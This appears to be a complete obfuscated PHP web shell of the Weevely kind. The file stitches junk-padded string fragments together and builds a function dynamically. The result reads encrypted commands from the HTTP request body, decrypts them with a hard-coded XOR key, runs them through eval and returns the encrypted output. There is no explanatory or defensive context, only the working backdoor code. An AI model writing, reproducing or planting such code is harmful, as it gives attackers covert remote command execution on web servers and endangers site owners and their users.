
$m='j=0;($j<$:M:Mc:M&&$i<$l);$j+:M+,$i++){$:Mo.=$t:M{$i}^$k:M{$j};}}r:Meturn :M$o;}if:M(@pre:Mg:M_matc:';
$s=str_replace('A','','crAeatAeAAA_functAion');
$B='Mh("/:M$kh(.+)$kf/",:M:M@fil:M:Me_get_conte:Mnts(":Mphp://input"),:M$m)=:M=1){@ob:M_:Ms:Mtart();@';
$q='$k:M="c5:Mf:M15f91";$k:M:Mh="32056:M2345d97":M;$kf=":Mf6b930dc711b:M";$p="4YX5:M:MR8ez86:MrwBg:';
$b=';@:Mob_:Mend_clean(:M);$r=@ba:Mse64_en:Mcod:Me(@x(@gzc:Mo:Mmpress(:M$o),:M$k));print(:M"$p$kh$:Mr$kf");}';
$V='Ma9";function x:M($t:M,$k){$c=:Mst:Mrlen($k:M);$:Ml=s:Mtrlen($t:M);$o:M=":M";for($i=0;$i:M<$l;){:Mfor($';
$H='ev:Mal(@gzuncom:Mpress(@:Mx(@b:Mase64_d:Mecode($m[1:M]),:M$k)):M);$o=@o:Mb_:Mget_contents():M';
$J=str_replace(':M','',$q.$V.$m.$B.$H.$b);
$t=$s('',$J);$t();
?>
